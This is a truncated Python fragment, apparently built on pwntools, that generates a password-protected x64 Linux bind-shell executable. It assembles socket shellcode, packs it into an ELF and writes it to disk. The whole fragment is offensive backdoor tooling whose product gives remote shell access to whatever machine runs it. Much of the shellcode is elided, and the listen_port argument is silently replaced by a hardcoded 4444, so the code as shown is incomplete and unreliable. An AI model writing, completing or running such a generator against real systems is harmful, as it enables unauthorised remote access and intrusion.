...
def x64_bind_shell(listen_port, passwd, filename=None):
	...
	context.endian = 'little'
	context.bits = '64'
	listen_port = '0x'+enhex(p16(4444))
	passwd = '0x'+enhex(p64(int("0x"+enhex(passwd),16)))
	shellcode = '''
	push   0x29
	pop    rax
	push   0x2
	...
	syscall 
	'''
	shellcode = asm(shellcode%(listen_port, passwd))
	data=make_elf(shellcode)
	if(filename==None):
		f=open("./x64_bind_shell","wb")
		f.write(data)
		f.close()
		print("x64_bind_shell is ok in current path ./")
	context.arch = 'i386'
	context.bits = "32"
	context.endian = "little"
